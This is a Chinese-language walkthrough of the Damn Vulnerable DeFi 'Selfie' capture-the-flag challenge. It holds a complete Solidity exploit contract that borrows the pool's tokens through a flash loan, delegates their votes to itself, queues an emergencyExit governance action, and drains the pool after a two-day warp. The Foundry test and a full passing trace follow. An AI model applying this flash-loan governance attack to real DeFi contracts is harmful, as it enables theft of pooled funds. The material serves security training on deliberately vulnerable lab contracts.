## 题目 [Selfie](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/selfie)
一个新的借贷池已经上线！它现在提供 DVT 代币的闪电贷。它甚至包括一个精巧的治理机制来控制它。能出什么问题呢？  
你开始时余额中没有任何 DVT 代币，而池子里有 150 万个 DVT 代币处于风险中。将池子中的所有资金救出，并存入指定的恢复账户。  

## 合约分析
1. **`SelfiePool` 合约** 提供闪电贷功能，并使用 ERC3156 标准接口。池子中的 emergencyExit 函数只能由治理合约调用，用于在紧急情况下将所有代币转移到一个特定账户。
2. **`SimpleGovernance` 合约** 允许创建治理动作（action），但需要一半以上的投票权，并且在创建动作后需要等待 2 天才能执行。

## 解题步骤
1. **利用闪电贷获取投票权**：由于 `SelfiePool` 合约允许我们借用 DVT 代币，我们可以借用足够数量的 DVT 代币，并使用这些代币来代理投票，从而获取超过 50% 的投票权。
2. **创建治理动作**：在代理投票权后，我们可以调用 `SimpleGovernance` 合约的 `queueAction` 方法，创建一个调用 `SelfiePool` 合约的 `emergencyExit` 函数的治理动作，将池中的所有资金转移到我们控制的地址。  
3. **排队并执行动作**：创建动作后，我们等待 2 天（利用 `vm.warp` 方法），然后执行 `executeAction` 方法来执行转账。

**合约代码**  
下面是攻击合约的代码，它实现了 ERC3156 的借款者接口（IERC3156FlashBorrower），并利用闪电贷来代理投票和创建治理动作：
``` solidity
contract SelfieExploiter is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        // 代理投票
        damnValuableToken.delegate(address(this));

        // 创建治理动作
        uint256 _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        
        // 归还闪电贷
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        require(selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), 1_500_000e18, data));
    }

    function exploitCloseup() external {
        simpleGovernance.executeAction(actionId);
    }
}
```
**测试代码**  
```
function test_selfie() public checkSolvedByPlayer {
    SelfieExploiter exploiter = new SelfieExploiter(
        address(pool),
        address(governance),
        address(token)
    );
    exploiter.exploitSetup(address(recovery));
    vm.warp(block.timestamp + 2 days);
    exploiter.exploitCloseup();
}
```
**运行测试**  
```
forge test --mp test/selfie/Selfie.t.sol -vvvv
```
**运行结果**  
```
[PASS] test_selfie() (gas: 747486)
Traces:
  [797686] SelfieChallenge::test_selfie()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [399625] → new SelfieExploiter@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 1662 bytes of code
    ├─ [305393] SelfieExploiter::exploitSetup(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   ├─ [301342] SelfiePool::flashLoan(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   ├─ [34680] DamnValuableVotes::transfer(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [247763] SelfieExploiter::onFlashLoan(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   │   ├─ [70257] DamnValuableVotes::delegate(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateChanged(delegator: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 0, newVotes: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [125514] SimpleGovernance::queueAction(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   │   │   ├─ [966] DamnValuableVotes::getVotes(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   │   ├─ [2349] DamnValuableVotes::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 2000000000000000000000000 [2e24]
    │   │   │   │   ├─ emit ActionQueued(actionId: 1, caller: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [24762] DamnValuableVotes::approve(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Approval(owner: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    │   │   ├─ [8928] DamnValuableVotes::transferFrom(SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 1500000000000000000000000 [1.5e24], newVotes: 0)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(172801 [1.728e5])
    │   └─ ← [Return] 
    ├─ [41076] SelfieExploiter::exploitCloseup()
    │   ├─ [39917] SimpleGovernance::executeAction(1)
    │   │   ├─ emit ActionExecuted(actionId: 1, caller: SelfieExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [33904] SelfiePool::emergencyExit(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   │   ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   ├─ [30680] DamnValuableVotes::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit EmergencyExit(receiver: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [563] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    ├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.93ms (464.83µs CPU time)
```

